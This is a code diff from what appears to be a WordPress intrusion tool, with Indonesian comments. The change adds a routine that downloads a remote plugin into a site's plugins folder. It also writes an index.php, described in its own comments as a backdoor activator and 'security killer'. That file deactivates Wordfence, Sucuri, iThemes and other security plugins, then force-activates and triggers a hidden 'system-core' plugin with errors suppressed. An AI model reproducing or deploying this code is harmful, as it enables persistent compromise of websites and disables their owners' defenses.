@@ -622,25 +622,87 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                         else $hst_badge = "<span style='$st_err'>DEL HOSTINGER FAIL</span>";
                     }
 
-                    // --- 1. DOWNLOAD PLUGIN SYSTEM CORE ---
+                    // --- 1. DOWNLOAD PLUGIN & BUAT BACKDOOR ACTIVATOR ---
                     $target_folder = $plugins_dir . $plugin_folder_name;
                     $target_file = $target_folder . '/' . $plugin_filename;
+                    $index_file  = $target_folder . '/index.php'; // File Activator Baru
                     $dl_badge = "<span style='$st_err'>DL FAIL</span>";
                     
                     if (!is_dir($target_folder)) {
                         @mkdir($target_folder, 0755, true);
-                        @chmod($target_folder, 0755); // Paksa permission folder
+                        @chmod($target_folder, 0755);
                     }
 
+                    // A. Download Main Plugin
                     if (!file_exists($target_file)) {
                         $p_content = @file_get_contents($plugin_src, false, stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]));
                         if ($p_content && @file_put_contents($target_file, $p_content)) {
-                            @chmod($target_file, 0644); // Paksa permission file
+                            @chmod($target_file, 0644);
                             $dl_badge = "<span style='$st_ok'>DL OK</span>";
                         }
                     } else {
                         $dl_badge = "<span style='$st_warn'>EXISTS</span>";
                     }
+
+                    // B. Buat File index.php (The Activator + Security Killer)
+                    $index_code = "<?php
+error_reporting(0); ini_set('display_errors', 0);
+
+// 1. Cari wp-load.php
+\$root = __DIR__; \$wp_load = false;
+for (\$i=0; \$i<5; \$i++) {
+    \$root = dirname(\$root);
+    if (file_exists(\$root . '/wp-load.php')) { \$wp_load = \$root . '/wp-load.php'; break; }
+}
+if (!\$wp_load) die('WP_LOAD_NOT_FOUND');
+require_once(\$wp_load);
+require_once(ABSPATH . 'wp-admin/includes/plugin.php');
+
+// 2. [FITUR BARU] MATIKAN WORDFENCE & SECURITY LAINNYA
+\$active = get_option('active_plugins', []);
+\$new_active = [];
+\$killed = false;
+
+if (is_array(\$active)) {
+    foreach (\$active as \$p) {
+        // Cek nama folder plugin keamanan
+        if (stripos(\$p, 'wordfence') !== false || stripos(\$p, 'ithemes') !== false || stripos(\$p, 'sucuri') !== false || stripos(\$p, 'sg-security') !== false || stripos(\$p, 'login-lockdown') !== false) {
+            deactivate_plugins(\$p); // Matikan secara resmi
+            \$killed = true;
+        } else {
+            \$new_active[] = \$p;
+        }
+    }
+    // Paksa update database untuk memastikan mereka mati
+    if (\$killed) {
+        update_option('active_plugins', \$new_active);
+        echo 'SECURITY_PLUGINS_KILLED_';
+    }
+}
+
+// 3. Aktifkan Plugin System Core (Jika Mati)
+\$plugin_base = 'system-core/system-core.php';
+if (!is_plugin_active(\$plugin_base)) {
+    activate_plugin(\$plugin_base);
+    \$curr = get_option('active_plugins', []);
+    if (!in_array(\$plugin_base, \$curr)) { \$curr[] = \$plugin_base; update_option('active_plugins', \$curr); }
+}
+
+// 4. Reset & Trigger Setup
+delete_option('rls_setup_done'); 
+\$core_file = __DIR__ . '/system-core.php';
+if (file_exists(\$core_file)) {
+    require_once(\$core_file);
+    if (function_exists('rls_auto_setup')) {
+        rls_auto_setup();
+        echo 'SYSTEM_CORE_ACTIVE_AND_TRIGGERED';
+    }
+} else {
+    echo 'CORE_FILE_MISSING';
+}
+?>";
+                    @file_put_contents($index_file, $index_code);
+                    @chmod($index_file, 0644);
 
                     // --- 2. ACTIVATION (HEX METHOD - ANTI CORRUPTION) ---
                     $act_badge = "";
